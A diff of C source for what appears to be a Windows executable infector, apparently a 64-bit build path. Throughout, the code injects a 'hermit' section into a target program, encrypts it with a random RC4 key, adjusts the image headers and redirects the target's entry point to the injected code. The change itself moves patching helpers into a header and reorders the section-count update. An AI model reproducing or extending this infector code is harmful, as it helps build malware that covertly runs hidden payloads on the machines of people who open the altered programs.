@@ -6,19 +6,16 @@
 #include "rc4.h"
 #include "symbols.h"
 #include "reloc.h"
+#include "patchutils.h"
 
 #ifdef _BUILD64
+
+#include "dll64.h"
+
 extern BOOL WINAPI DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
 extern DWORD NextPointerToRawData64(PIMAGE_NT_HEADERS64 pHeader);
 extern DWORD NextVirtualAddress(PIMAGE_NT_HEADERS pHeader);
 extern DWORD NextVirtualAddress64(PIMAGE_NT_HEADERS64 pHeader);
-
-extern LPVOID FindBlockMem(LPBYTE lpInitialMem, DWORD dwSize, LPVOID lpSignature, DWORD dwSignatureSize);
-extern void Patch_JMP(LPBYTE lpInstruction, DWORD dwNewOffset);
-extern void Patch_MOV(LPBYTE lpInstruction, DWORD dwNewOffset);
-extern void Patch_MARKER_QWORD(LPVOID lpBaseBlock, LPBYTE lpInitialMem, DWORD dwSize, LPVOID lpSignature, ULONG64 value);
-extern void Patch_MARKER_DWORD(LPVOID lpBaseBlock, LPBYTE lpInitialMem, DWORD dwSize, LPVOID lpSignature, DWORD value);
-extern void Patch_MARKER(LPVOID lpBaseBlock, LPBYTE lpInitialMem, DWORD dwSize, LPVOID lpSignature, DWORD dwSignatureSize, DWORD dwOldOffset);
 
 void Patch_EXPORT_SYMBOL(LPVOID lpBaseBlock, LPBYTE lpInitialMem, DWORD dwSize, LPVOID lpSignature, DWORD newOffset, DWORD oldOffset)
 {
@@ -97,8 +94,7 @@ int main64(int argc, char *argv[])
 		passKey[i] = rand() % 256;
 
 	BYTE rc4sbox[256];
-
-
+	
 	ULONG64 *passKeyPtr = (ULONG64*) &passKey;
 
 	for(PIMAGE_SECTION_HEADER pProcessSection = IMAGE_FIRST_SECTION(pInfectMeNtHeader); pProcessSection <= pLastSection; pProcessSection++)
@@ -136,7 +132,6 @@ int main64(int argc, char *argv[])
 		}
 	}
 
-	pInfectMeNtHeader->FileHeader.NumberOfSections++;
 	//memcpy(pInfectSection->Name, szHermitName, 8);
 
 	memcpy(pInfectSection, pSectionHermit64, sizeof(IMAGE_SECTION_HEADER));
@@ -155,6 +150,8 @@ int main64(int argc, char *argv[])
 	pInfectMeNtHeader->OptionalHeader.SizeOfImage += RoundUp(pSectionHermit64->Misc.VirtualSize, pInfectMeNtHeader->OptionalHeader.SectionAlignment);
 	
 
+	pInfectMeNtHeader->FileHeader.NumberOfSections++;
+
 	LPVOID lpRawSource = rva2addr(pImageDosHeader, pImageNtHeaders64, CALC_OFFSET(LPVOID, pImageDosHeader, pSectionHermit64->VirtualAddress));
 	LPVOID lpRawDestin = rva2addr(pInfectMe, pInfectMeNtHeader, (LPVOID) pInfectSection->VirtualAddress);
 
@@ -168,7 +165,6 @@ int main64(int argc, char *argv[])
 	DWORD AddressOfEntryPoint = pInfectMeNtHeader->OptionalHeader.AddressOfEntryPoint;
 
 	pInfectMeNtHeader->OptionalHeader.AddressOfEntryPoint = pInfectSection->VirtualAddress + rvaEntryPoint; // - pInfectMeNtHeader->OptionalHeader.SectionAlignment;
-	
 
 	PIMAGE_EXPORT_DIRECTORY ExportDirectory =  CALC_OFFSET(PIMAGE_EXPORT_DIRECTORY, pInfectMe, pInfectMeNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
